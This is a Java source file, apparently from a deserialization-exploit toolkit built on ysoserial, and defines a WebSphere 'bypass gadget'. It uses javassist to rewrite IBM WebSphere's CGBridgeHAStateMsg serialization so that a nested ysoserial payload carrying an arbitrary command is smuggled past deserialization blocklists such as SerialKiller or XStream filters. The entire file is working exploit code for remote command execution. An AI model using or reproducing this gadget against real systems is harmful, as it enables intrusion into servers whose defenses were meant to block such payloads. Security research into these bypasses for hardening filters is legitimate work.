package serialkiller.bypass;

import com.ibm.ws.cgbridge.msg.CGBridgeHAStateMsg;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import ysoserial.payloads.annotation.Dependencies;

import java.lang.reflect.Constructor;

/**
 * Created by alvaro on 08/04/16.
 */

@Dependencies({ "websphere"} )
public class WebSphere4 implements BypassGadget {

    public Object wrapPayload(String command, Class payload) throws Exception {

        String payload_class = payload.getName();

        ClassPool pool = ClassPool.getDefault();
        CtClass c = pool.get("com.ibm.ws.cgbridge.msg.CGBridgeHAStateMsg");
        CtClass objectOutputClass = pool.get("java.io.ObjectOutput");

        CtMethod writeExternalOrig = c.getDeclaredMethod("writeExternal");
        writeExternalOrig.setName("writeExternalDisabled");

        CtMethod writeExternalNew = new CtMethod(CtClass.voidType, "writeExternal", new CtClass[] {objectOutputClass}, c);
        String code = "{" +
                // REPLACING super.writeExternal to hardcode version
                // "super.writeExternal($1);" +
                "$1.writeInt(5);" +
                "$1.writeByte((byte)1);" +
                // END replacing super.writeExternal
                "$1.writeInt(1);" +
                "$1.writeUTF(\"\");" +
                "$1.writeUTF(\"\");" +
                "$1.writeUTF(\"\");" +
                "$1.writeObject(null);" +
                "com.ibm.ws.cgbridge.core.impl.CGBridgeBulletinBoardScopeDataImpl scope = new com.ibm.ws.cgbridge.core.impl.CGBridgeBulletinBoardScopeDataImpl(\"\", \"\", (byte)1);" +
                "byte[] bytes = new byte[] {0};" +
                "com.ibm.ws.cgbridge.msg.CGBridgeBBRemoteSubscriptionMsg msg = new com.ibm.ws.cgbridge.msg.CGBridgeBBRemoteSubscriptionMsg(\"\", \"\", true, scope, \"\");" +
                "$1.writeObject(msg);" +
                "$1.writeInt(1);" +
                "$1.writeLong(1L);" +
                "$1.writeInt(1);" +
                "java.io.ByteArrayOutputStream bytesOut = new java.io.ByteArrayOutputStream();" +
                "java.io.ObjectOutputStream objOut = new java.io.ObjectOutputStream(bytesOut);" +
                "java.lang.Object payload = new " + payload_class + "().getObject(\"" + command + "\");" +
                "objOut.writeObject(payload);" +
                "objOut.close();" +
                "bytesOut.close();" +
                "$1.writeObject(bytesOut.toByteArray());" +
                "}";
        writeExternalNew.setBody(code);
        c.addMethod(writeExternalNew);
        Class instrumentedClass = c.toClass();
        Constructor ctor = instrumentedClass.getConstructor();
        CGBridgeHAStateMsg msg = (CGBridgeHAStateMsg) ctor.newInstance();

        return msg;

    }

    public boolean bypassXStream() { return true; }
    public boolean skipTest() { return false; }
}

